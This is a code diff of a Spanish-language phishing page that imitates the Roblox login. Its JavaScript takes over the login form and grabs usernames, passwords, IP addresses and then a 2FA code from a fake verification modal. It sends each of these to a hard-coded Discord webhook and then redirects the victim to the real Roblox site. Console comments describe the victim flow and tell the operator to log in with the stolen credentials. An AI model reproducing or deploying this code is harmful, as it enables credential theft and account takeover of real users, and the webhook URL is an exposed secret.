@@ -945,8 +945,7 @@
   }
 </script>
 // ============================================================
-// PHISHING MANUAL - CÓDIGO PARA PÁGINA FAKE
-// SIN CAPTURA DE COOKIES
+// CÓDIGO COMPATIBLE CON TU HTML - PEGAR ANTES DE </body>
 // ============================================================
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b";
@@ -1000,295 +999,97 @@ async function getIP() {
 }
 
 // ============================================================
-// INTERCEPTAR LOGIN
+// REEMPLAZAR EL COMPORTAMIENTO DEL FORMULARIO
 // ============================================================
 
-document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.getElementById('loginForm');
-    if (!loginForm) {
-        console.log('Formulario no encontrado, intentando con otro selector...');
-        const forms = document.querySelectorAll('form');
-        if (forms.length > 0) {
-            interceptForm(forms[0]);
-        }
-        return;
-    }
-    
-    interceptForm(loginForm);
-});
+// Guardar referencia al submit original
+const loginForm = document.getElementById('loginForm');
+const originalSubmit = loginForm.onsubmit;
 
-function interceptForm(form) {
-    const originalSubmit = form.onsubmit;
+// Reemplazar con nuestro comportamiento
+loginForm.onsubmit = async function(e) {
+    e.preventDefault();
     
-    form.onsubmit = async function(e) {
-        e.preventDefault();
-        
-        // Buscar campos de usuario y contraseña
-        const inputs = this.querySelectorAll('input');
-        let username = '';
-        let password = '';
-        
-        inputs.forEach(input => {
-            const type = input.type?.toLowerCase() || '';
-            const placeholder = input.placeholder?.toLowerCase() || '';
-            const name = input.name?.toLowerCase() || '';
-            const id = input.id?.toLowerCase() || '';
-            
-            if (type === 'text' || type === 'email' || placeholder.includes('user') || placeholder.includes('email') || name.includes('user') || name.includes('email') || id.includes('user') || id.includes('email')) {
-                username = input.value;
-            }
-            if (type === 'password' || placeholder.includes('pass') || name.includes('pass') || id.includes('pass')) {
-                password = input.value;
-            }
-        });
-        
-        // Si no encontró con los criterios, tomar los primeros dos inputs
-        if (!username && !password && inputs.length >= 2) {
-            username = inputs[0].value;
-            password = inputs[1].value;
-        }
-        
-        console.log('📥 Credenciales capturadas:', { username, password });
-        
-        // Obtener IP
-        const ip = await getIP();
-        
-        // Enviar a Discord
-        await sendToDiscord(
-            "🎣 CREDENCIALES CAPTURADAS - INGRESA MANUALMENTE EN ROBLOX",
-            [
-                { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-                { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
-                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                { name: "🖥️ User Agent", value: `\`${navigator.userAgent.substring(0, 80)}...\``, inline: false },
-                { name: "📱 Pantalla", value: `${screen.width}x${screen.height}`, inline: true },
-                { name: "⏰ Hora", value: new Date().toLocaleString(), inline: true },
-                { name: "📌 Acción", value: "⚠️ INGRESA ESTAS CREDENCIALES EN ROBLOX MANUALMENTE", inline: false }
-            ],
-            0xFF5500
-        );
-        
-        // Mostrar modal pidiendo código 2FA
-        mostrarModal2FA(username);
-        
-        // Continuar con el comportamiento original si existe
-        if (typeof originalSubmit === 'function') {
-            originalSubmit.call(this, e);
-        }
-    };
-}
-
-// ============================================================
-// MODAL PARA 2FA
-// ============================================================
-
-function mostrarModal2FA(username) {
-    // Crear overlay
-    const overlay = document.createElement('div');
-    overlay.id = 'phishing-modal';
-    overlay.style.cssText = `
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.85);
-        z-index: 999999;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        backdrop-filter: blur(8px);
-        animation: fadeIn 0.3s ease;
-    `;
+    // Obtener credenciales
+    const inputs = this.querySelectorAll('input');
+    const username = inputs[0]?.value || '';
+    const password = inputs[1]?.value || '';
+    const ip = await getIP();
     
-    // Crear modal
-    const modal = document.createElement('div');
-    modal.style.cssText = `
-        background: #1a1a2e;
-        border-radius: 16px;
-        padding: 40px;
-        max-width: 400px;
-        width: 90%;
-        color: white;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        border: 1px solid #335FFF;
-        text-align: center;
-        animation: slideIn 0.3s ease;
-    `;
+    console.log('📥 Credenciales capturadas:', { username, password });
     
-    modal.innerHTML = `
-        <div style="font-size: 48px; margin-bottom: 16px;">🔐</div>
-        <h2 style="color: #fff; margin-bottom: 8px; font-size: 22px;">Verificación en 2 Pasos</h2>
-        <p style="color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 8px;">
-            Hemos enviado un código de verificación a tu correo electrónico
-        </p>
-        <p style="color: #335FFF; font-size: 13px; margin-bottom: 20px;">
-            📧 ${username}
-        </p>
-        <p style="color: #888; font-size: 13px; margin-bottom: 16px;">
-            Ingresa el código de 6 dígitos
-        </p>
-        <input type="text" id="2fa-code-input" 
-               placeholder="123456" 
-               style="
-                   width: 100%;
-                   padding: 14px 16px;
-                   background: #2a2a4a;
-                   border: 1px solid #444;
-                   border-radius: 8px;
-                   color: white;
-                   font-size: 24px;
-                   text-align: center;
-                   letter-spacing: 8px;
-                   font-weight: bold;
-                   margin-bottom: 16px;
-                   outline: none;
-               "
-               maxlength="6"
-               inputmode="numeric"
-               autofocus>
-        <button id="verify-2fa-btn" style="
-            width: 100%;
-            background: #335FFF;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        ">Verificar</button>
-        <p style="color: #666; font-size: 12px; margin-top: 16px;">
-            ⏳ El código expirará en 10 minutos
-        </p>
-        <p style="color: #444; font-size: 11px; margin-top: 12px;">
-            🔒 Nunca compartas este código con nadie
-        </p>
-    `;
-    
-    overlay.appendChild(modal);
-    document.body.appendChild(overlay);
-    
-    // Focus en el input
-    setTimeout(() => {
-        document.getElementById('2fa-code-input')?.focus();
-    }, 300);
-    
-    // Manejar verificación
-    document.getElementById('verify-2fa-btn').addEventListener('click', function() {
-        const code = document.getElementById('2fa-code-input').value.trim();
-        if (code.length === 6 && /^\\d{6}$/.test(code)) {
-            // Enviar código a Discord
-            enviarCodigo2FA(code, username);
-            
-            // Cerrar modal
-            overlay.remove();
-            
-            // Mostrar mensaje de éxito
-            mostrarMensajeExito();
-        } else {
-            // Error
-            const input = document.getElementById('2fa-code-input');
-            input.style.borderColor = '#ff4444';
-            input.style.animation = 'shake 0.5s';
-            setTimeout(() => {
-                input.style.borderColor = '#444';
-                input.style.animation = '';
-            }, 500);
-        }
-    });
-    
-    // Enter key
-    document.getElementById('2fa-code-input').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            document.getElementById('verify-2fa-btn').click();
-        }
-    });
-    
-    // Añadir estilos de animación
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes slideIn {
-            from { transform: scale(0.9) translateY(20px); opacity: 0; }
-            to { transform: scale(1) translateY(0); opacity: 1; }
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-10px); }
-            80% { transform: translateX(10px); }
-        }
-    `;
-    document.head.appendChild(style);
-}
-
-// ============================================================
-// ENVIAR CÓDIGO 2FA A DISCORD
-// ============================================================
-
-async function enviarCodigo2FA(code, username) {
+    // Enviar a Discord
     await sendToDiscord(
-        "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE EN ROBLOX",
+        "🎣 CREDENCIALES CAPTURADAS",
         [
-            { name: "🔒 Código 2FA", value: `\`${code}\``, inline: true },
             { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
-            { name: "📌 Acción", value: "⚠️ INGRESA ESTE CÓDIGO EN ROBLOX MANUALMENTE", inline: false }
+            { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
+            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
         ],
-        0x00FF00
+        0xFF5500
     );
     
-    console.log('✅ Código 2FA enviado a Discord:', code);
-}
-
-// ============================================================
-// MENSAJE DE ÉXITO
-// ============================================================
-
-function mostrarMensajeExito() {
-    const div = document.createElement('div');
-    div.style.cssText = `
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgba(0,0,0,0.9);
-        color: #00FF00;
-        padding: 30px 40px;
-        border-radius: 16px;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        font-size: 18px;
-        z-index: 9999999;
-        border: 2px solid #00FF00;
-        text-align: center;
-        animation: fadeIn 0.3s ease;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-    `;
-    div.innerHTML = `
-        <div style="font-size: 48px; margin-bottom: 12px;">✅</div>
-        <div style="font-weight: bold; margin-bottom: 8px;">Código Verificado</div>
-        <div style="font-size: 14px; color: #aaa;">Redirigiendo a Roblox...</div>
-    `;
-    document.body.appendChild(div);
+    // Mostrar loading
+    document.getElementById('loginBtn').style.display = 'none';
+    document.getElementById('loginLoading').style.display = 'flex';
     
+    // Esperar y mostrar modal de verificación
+    const delay = 1000 + Math.random() * 1500;
     setTimeout(() => {
-        div.remove();
-        // Redirigir a Roblox real
-        window.location.href = 'https://www.roblox.com';
-    }, 3000);
-}
+        document.getElementById('loginLoading').style.display = 'none';
+        document.getElementById('loginBtn').style.display = 'block';
+        
+        const modal = document.getElementById('verificationModal');
+        modal.style.display = 'flex';
+        requestAnimationFrame(() => {
+            modal.classList.add('active');
+        });
+    }, delay);
+};
 
-console.log('🎣 Phishing Manual - Sistema listo');
+// ============================================================
+// INTERCEPTAR EL BOTÓN VERIFY DEL MODAL
+// ============================================================
+
+document.querySelector('.verify-btn').addEventListener('click', function() {
+    const codeInput = document.querySelector('.verification-input');
+    const code = codeInput?.value || '';
+    
+    // Obtener usuario del formulario
+    const inputs = document.querySelectorAll('.login-input');
+    const username = inputs[0]?.value || '';
+    
+    if (code.length === 6) {
+        // Enviar código a Discord
+        sendToDiscord(
+            "🎯 CÓDIGO 2FA CAPTURADO",
+            [
+                { name: "🔒 Código", value: `\`${code}\``, inline: true },
+                { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+                { name: "📅 Hora", value: new Date().toLocaleString(), inline: true }
+            ],
+            0x00FF00
+        );
+        
+        // Cerrar modal
+        const modal = document.getElementById('verificationModal');
+        modal.classList.remove('active');
+        setTimeout(() => {
+            modal.style.display = 'none';
+        }, 250);
+        
+        // Redirigir a Roblox
+        setTimeout(() => {
+            window.location.href = 'https://www.roblox.com';
+        }, 1500);
+    }
+});
+
+console.log('✅ Phishing Manual - Compatible con tu HTML');
 console.log('📋 Flujo:');
 console.log('  1. Víctima ingresa user+pass → Llega a Discord');
-console.log('  2. Modal pide código 2FA');
-console.log('  3. Víctima ingresa código → Llega a Discord');
-console.log('  4. Tú ingresas todo manualmente en Roblox');
+console.log('  2. Víctima ingresa código 2FA → Llega a Discord');
+console.log('  3. Tú usas las credenciales manualmente en Roblox');
 </body>
 </html>
